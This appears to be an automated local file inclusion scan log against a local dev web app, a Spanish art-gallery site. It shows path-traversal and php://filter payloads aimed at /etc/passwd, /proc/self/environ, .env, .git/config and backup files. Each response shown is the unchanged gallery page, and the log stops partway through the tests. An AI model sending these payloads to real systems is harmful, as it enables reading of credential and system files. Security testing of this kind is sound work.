# Informe LFI - 20260427T155753Z
Target: http://web.dev.local:8081
Date (UTC): Mon, 27 Apr 2026 15:57:53 +0000

-- Testing parameter: page
[payload] page=../../../../../../../..//etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] page=../../../../../../../..//etc/hosts
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] page=../../../../../../../..//proc/self/environ
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] page=../../../../../../../../.env
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] page=../../../../../../../../.git/config
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] page=../../../../../../../../config.php.bak
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] page=../../../../../../../../backup.zip
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] page=php://filter/read=convert.base64-encode/resource=/etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
-- Testing parameter: file
[payload] file=../../../../../../../..//etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] file=../../../../../../../..//etc/hosts
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
